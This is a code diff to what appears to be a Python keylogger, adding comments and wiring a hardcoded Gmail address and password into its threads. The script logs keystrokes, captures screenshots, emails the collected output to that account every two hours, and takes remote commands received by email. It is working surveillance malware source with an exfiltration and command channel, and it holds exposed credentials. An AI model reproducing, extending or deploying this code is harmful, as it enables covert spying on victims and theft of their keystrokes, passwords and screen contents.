@@ -16,8 +16,12 @@ screenDir = "screenShots\\"
 logDir = "logFiles\\"
 from queue import Queue
 	
+	
+#username and password for the desired email
 email = "keylog460@gmail.com"
 passwd = 'TheAllSpark'	
+
+#interval in seconds that the output is sent to the email
 sendInter = 60*60*2
 	
 def sendOutput():
@@ -79,14 +83,14 @@ if __name__ == '__main__':
 	
 	
 
-	
+	#start all of the threads 
 	logTh = logger(logQ, args=(True, outputDir + logDir))
 	logTh.start()
 	
 	screenTh = screenCapper(screenQ, args=(True, outputDir + screenDir))
 	screenTh.start()
 	
-	sendTh = sender(sendInQ, sendOutQ, args=(True, outputDir))
+	sendTh = sender(sendInQ, sendOutQ, args=(True, outputDir, email, passwd))
 	sendTh.start()
 	
 	recTh = receiveThread(recInQ, recOutQ, args=(True, email, passwd))
@@ -97,13 +101,16 @@ if __name__ == '__main__':
 	
 	action = ""
 	stop = False
+	
+	#while there are still actions to do, or the stop command has not been given
 	while(not stop or not recTh.outQueue.empty()):
 		action = ""
 		time.sleep(1)
-		if(time.time() - lastSend > sendInter): # send every 2 hours
+		if(time.time() - lastSend > sendInter): 
 			lastSend = time.time()
 			doSend(logTh, screenTh, sendTh, recTh)
-
+		
+		#get commands from the thread receiving email
 		if not recTh.outQueue.empty():
 			action = recTh.outQueue.get()
 			print("recieved: " + action)
